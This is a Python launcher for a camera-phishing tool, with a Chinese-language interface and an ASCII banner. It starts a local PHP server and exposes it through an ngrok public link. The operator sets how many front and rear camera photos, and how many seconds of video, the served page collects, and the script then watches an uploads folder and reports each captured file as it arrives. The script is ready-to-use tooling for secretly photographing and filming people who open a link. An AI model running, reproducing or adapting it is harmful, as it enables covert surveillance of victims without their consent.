import subprocess,time,re,shutil,sys,os,random
from datetime import datetime
try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
except ImportError:
    print("Installing watchdog...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "watchdog", "--break-system-packages"])
    except subprocess.CalledProcessError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "watchdog"])
        
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler

try:
    from colorama import init,Fore
except ImportError:
    print("Installing colorama...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama", "--break-system-packages"])
    except subprocess.CalledProcessError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
        
    from colorama import init,Fore

init()  


colors = {
    "red": '\033[00;31m',
    "green": '\033[00;32m',
    "light_green": '\033[01;32m',
    "yellow": '\033[01;33m',
    "light_red": '\033[01;31m',
    "blue": '\033[94m',
    "purple": '\033[01;35m',
    "cyan": '\033[00;36m',
    "grey": '\033[90m',
    "reset": Fore.RESET,
}

messages = {
    "true": f"{colors['red']}[{colors['light_green']}+{colors['red']}] {colors['light_green']}",
    "forindex": f"{colors['red']}[{colors['green']}?{colors['red']}] {colors['green']}",
    "error": f"{colors['red']}[{colors['light_red']}-{colors['red']}] {colors['light_red']}"
}

PHP_PORT = 8080
PHP_FOLDER = "./"  
FOLDER_TO_WATCH = "uploads"
INDEX = "index.html"
TOKEN_FILE = "token.txt"
# -------------------------------------------------------------------

def clear():
    os.system("cls || clear")

def OS():
    return os.path.exists("/data/data/com.termux")

clear()

if not shutil.which("php"):
    if OS():
        subprocess.run(["pkg", "install", "php"])
    elif 'Linux' in __import__("platform").system():
        subprocess.run(["sudo", "apt", "install","php"])
    print(f"\n{messages['error']}PHP未安装！\n\nWindows安装地址: https://www.php.net/downloads.php")

if not shutil.which("ngrok"):
    print(f"\n{messages['error']}ngrok未安装！将无法进行内网穿透。\n\nWindows安装命令: winget install ngrok -s msstore\n或者下载便携版: https://ngrok.com/download/windows?tab=download\n\nTermux安装命令: \npkg update -y\npkg install git\ngit clone https://github.com/Yisus7u7/termux-ngrok\ncd termux-ngrok\nbash install.sh\n\nLinux下载地址: https://ngrok.com/download/linux\n\n安装后请添加你的token (ngrok config add-authtoken <token>)")

def tokenngrok():
    if os.path.isfile(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        return token if token else None
    
user = os.popen("whoami").read().strip()
os.environ["USER"] = user

if OS():
    os.environ["HOME"] = os.environ.get("HOME") 
    b = f"""{colors['cyan']}                                                                                           
▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 

    {colors['red']}by:Xheishou.com-x@root{colors['reset']}\n\n                                       
"""
else:
    if 'Linux' in __import__("platform").system():
        os.environ["HOME"] = f"/home/{user}"
    b = f"""{colors['cyan']}
       _..._                                                                                          
    .-'_..._''.                                                                                       
  .' .'      '.\          __  __   ___  _________   _...._        .        .--.           .           
 / .'                    |  |/  `.'   `.\        |.'      '-.   .'|        |__|         .'|           
. '                      |   .-.  .-.   '\        .'```'.    '.<  |        .--.        <  |           
| |                 __   |  |  |  |  |  | \      |       \     \| |        |  |         | |           
| |              .:--.'. |  |  |  |  |  |  |     |        |    || | .'''-. |  |     _   | | .'''-.    
. '             / |   \ ||  |  |  |  |  |  |      \      /    . | |/.'''. \|  |   .' |  | |/.'''. \   
 \ '.          .`" __ | ||  |  |  |  |  |  |     |\`'-.-'   .'  |  /    | ||  |  .   | /|  /    | |   
  '. `._____.-'/ .'.''| ||__|  |__|  |__|  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |   
    `-.______ / / /   | |_                .'     '.             | |     | |  .'.'.-'  / | |     | |   
             `  \ \._,\ '/              '-----------'           | '.    | '. .'   \_.'  | '.    | '.  
                 `--'  `"                                       '---'   '---'           '---'   '---' 

                {colors['red']}by:Xheishou.com-x@root{colors['reset']}\n\n
                 """

print (b)
token = tokenngrok()

if not token:
    user_token = input(f"{messages['true']}请输入Ngrok Token (直接回车可跳过): {colors['reset']}")
    if user_token.strip():
        with open(TOKEN_FILE, "w") as f:
            f.write(user_token.strip())
        if shutil.which("ngrok"):
            subprocess.run(["ngrok", "config", "add-authtoken", user_token])
        else:
            print(f"{messages['error']}ngrok未安装，跳过配置命令。")
    else:
        print(f"{messages['true']}跳过Token设置，可能会导致ngrok连接受限。")

clear()
print (b)

forindex = input(f"{messages['forindex']}是否需要更改 'index.html' 文件的设置? (y/n): {colors['reset']}").upper()

if forindex == "Y":
    front_photo_count = input(f"{messages['forindex']}前置摄像头拍照数量 {colors['yellow']}(例如: 3){colors['reset']}: ")
    back_photo_count = input(f"{messages['forindex']}后置摄像头拍照数量 {colors['yellow']}(例如: 3){colors['reset']}: ")
    front_video_seconds = input(f"{messages['forindex']}前置摄像头录像秒数 {colors['yellow']}(例如: 5){colors['reset']}: ")
    back_video_seconds = input(f"{messages['forindex']}后置摄像头录像秒数 {colors['yellow']}(例如: 4){colors['reset']}: ")
    patterns = {
        'frontPhotoCount': r'let frontPhotoCount = \d+;',
        'backPhotoCount': r'let backPhotoCount = \d+;',
        'frontVideoSeconds': r'let frontVideoSeconds = \d+;',
        'backVideoSeconds': r'let backVideoSeconds = \d+;'
    }

    with open(INDEX, 'r', encoding='utf-8') as file:
        content = file.read()

    content = re.sub(patterns['frontPhotoCount'], f'let frontPhotoCount = {front_photo_count};', content)
    content = re.sub(patterns['backPhotoCount'], f'let backPhotoCount = {back_photo_count};', content)
    content = re.sub(patterns['frontVideoSeconds'], f'let frontVideoSeconds = {front_video_seconds};', content)
    content = re.sub(patterns['backVideoSeconds'], f'let backVideoSeconds = {back_video_seconds};', content)

    with open(INDEX, 'w', encoding='utf-8') as file:
        file.write(content)
    clear
    print(b)

def php_server():
    print(f"{messages['true']}正在启动PHP服务器，端口 {colors['yellow']}{PHP_PORT}{colors['reset']}...")
    php_proc = subprocess.Popen(
        ["php", "-S", f"0.0.0.0:{PHP_PORT}"],
        cwd=PHP_FOLDER,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    time.sleep(2)
    return php_proc

def ngrok(port):
    print(f"{messages['true']}正在启动ngrok，端口 {colors['yellow']}{port}{colors['reset']}...")
    ngrok_proc = subprocess.Popen(
        ["ngrok", "http", str(port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(8)  
    return ngrok_proc

def ngrok_url():
    try:
        result = subprocess.run(
            ['curl', '-s', '-N', 'http://127.0.0.1:4040/api/tunnels'],
            capture_output=True,
            text=True
        )
        output = result.stdout
        matches = re.findall(r"https://[0-9a-z]*\.ngrok-free\.app", output)
        if matches:
            for url in matches:
                print(f"\n{messages['true']}公开链接:", url)
            return matches
        else:
            print(f"\n{messages['error']}未找到ngrok链接。如果被封禁请使用VPN")
            exit()
    except Exception as e:
        print(f"\n{messages['error']}错误:", e)
        return None

class WatcherHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            file_name = os.path.basename(event.src_path)
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"\n{messages['true']}收到文件: {colors['green']}{file_name} {colors['red']}时间 {colors['yellow']}{current_time}")

if __name__ == "__main__":

    php_proc = php_server()
    
    ngrok_proc = None
    if shutil.which("ngrok"):
        ngrok_proc = ngrok(PHP_PORT)
        ngrok_url()
    else:
        print(f"\n{messages['error']}ngrok未安装，跳过启动ngrok服务。请手动配置端口映射或使用本地IP访问: http://127.0.0.1:{PHP_PORT}")

    event_handler = WatcherHandler()
    observer = Observer()
    observer.schedule(event_handler, FOLDER_TO_WATCH, recursive=False)
    observer.start()
    print(f"\n{messages['true']}照片捕获已启动 => {colors['yellow']}{FOLDER_TO_WATCH}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{colors['red']}正在停止服务器和监听器...")
        php_proc.terminate()
        if ngrok_proc:
            ngrok_proc.terminate()
        observer.stop()

        observer.join()
